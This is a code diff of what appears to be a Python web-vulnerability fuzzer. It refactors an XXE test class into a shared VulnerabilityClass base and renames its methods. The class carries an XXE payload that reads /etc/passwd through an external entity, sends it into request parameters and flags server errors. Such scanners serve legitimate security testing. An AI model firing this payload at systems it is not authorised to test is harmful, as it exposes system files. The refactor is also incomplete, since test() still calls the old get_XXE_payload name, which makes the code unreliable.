@@ -1,4 +1,6 @@
-class XXE:
+from vulnerability_class import VulnerabilityClass
+
+class XXE(VulnerabilityClass):
 
     fuzz = None
 
@@ -6,10 +8,10 @@ class XXE:
         self.fuzz = fuzz
 
     # from https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
-    def get_XXE_payload(self):
+    def get_payload(self):
         return '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
 
-    def verifyXXE(self, response, param, requestId):
+    def verify(self, response, param, requestId):
         try:
             if response.status_code>=500:
                 print "Potential XXE in "+requestId+" "+param
@@ -20,7 +22,7 @@ class XXE:
         except:
             return False
 
-    def testXXE(self, method, url, requestId, param, postData=None):
+    def test(self, method, url, requestId, param, postData=None):
         s=requests.Session()
         if method=='GET':
             newUrl = Fuzz.substParam(url,param,self.get_XXE_payload())
